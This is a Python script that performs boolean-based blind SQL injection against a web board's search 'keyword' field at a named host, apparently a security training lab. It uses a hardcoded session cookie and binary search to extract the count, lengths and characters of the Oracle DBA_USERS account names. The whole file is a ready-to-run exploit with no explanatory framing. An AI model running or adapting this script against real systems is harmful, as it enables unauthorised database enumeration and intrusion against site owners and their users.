from requests import post
from sys import exit

### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
targetString = "카카오"

baseQuery = "aaaa%' and {} and 'a%'='a"

userNameCount = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > "
userNameIndex = "(SELECT length(USERNAME) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
userNameData = "(SELECT ascii(substr(USERNAME, {}, 1)) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "

headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}


### FUNCTION AREA
def check_query(query, mid):
    completeQuery = query + str(mid)
    data["keyword"] = baseQuery.format(completeQuery)
    r = post(targetURL, headers=headers, cookies=cookies, data=data)

    if targetString in r.text:
        return True
    else:
        return False


def binary_search(low, high, query):
    result = None  # 조건을 만족하는 최소 mid 값을 저장할 변수
    while low <= high:
        mid = (low + high) // 2
        if check_query(query, mid):
            # query is over mid
            low = mid + 1
        else:
            # mid found, narrow down searching
            result = mid
            high = mid - 1
    return result


if __name__ == "__main__":
    result = {}
    NameCountMAX = binary_search(0, 100, userNameCount)
    print(f"{NameCountMAX} names here")

    for NameCount in range(1, NameCountMAX + 1):
        name = ""
        NameIndexMAX = binary_search(1, 30, userNameIndex.format(NameCount))
        print(f"{NameCount} user name: {NameIndexMAX} characters")

        for NameIndex in range(1, NameIndexMAX + 1):
            nameChr = chr(
                binary_search(32, 126, userNameData.format(NameIndex, NameCount))
            )
            print(nameChr)
            name = name + nameChr

        result[str(NameCount)] = name
        print(f"{NameCount}:{name} Done.")

    print(result)
